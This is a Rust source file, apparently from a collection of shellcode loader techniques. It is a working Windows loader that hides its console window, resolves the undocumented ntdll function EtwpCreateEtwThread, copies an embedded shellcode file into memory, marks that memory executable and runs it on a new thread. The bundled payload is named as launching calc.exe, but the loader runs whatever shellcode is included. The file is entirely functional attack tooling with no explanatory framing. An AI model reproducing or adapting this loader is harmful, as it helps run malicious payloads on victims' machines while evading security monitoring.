#![windows_subsystem = "windows"]

use std::ffi::c_void;
use std::mem::transmute;
use std::ptr::{copy, null, null_mut};
use windows_sys::Win32::Foundation::{FALSE, HANDLE, WAIT_FAILED};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::WaitForSingleObject;

static SHELLCODE: [u8; 98] = *include_bytes!("../../w64-exec-calc-shellcode-func.bin");
static SIZE: usize = SHELLCODE.len();

#[cfg(target_os = "windows")]
fn main() {
    let mut old = PAGE_READWRITE;

    unsafe {
        let ntdll = LoadLibraryA("ntdll.dll\0".as_ptr());
        if ntdll == 0 {
            eprintln!("LoadLibraryA failed!");
            return;
        }

        let fn_etwp_create_etw_thread = GetProcAddress(ntdll, "EtwpCreateEtwThread\0".as_ptr());

        let etwp_create_etw_thread: extern "C" fn(*mut c_void, isize) -> HANDLE =
            transmute(fn_etwp_create_etw_thread);

        let dest = VirtualAlloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if dest == null_mut() {
            eprintln!("VirtualAlloc failed!");
            return;
        }

        copy(SHELLCODE.as_ptr(), dest as *mut u8, SIZE);

        let res = VirtualProtect(dest, SIZE, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            eprintln!("VirtualProtect failed!");
            return;
        }

        let thread = etwp_create_etw_thread(dest, 0);

        WaitForSingleObject(thread, WAIT_FAILED);
    }
}
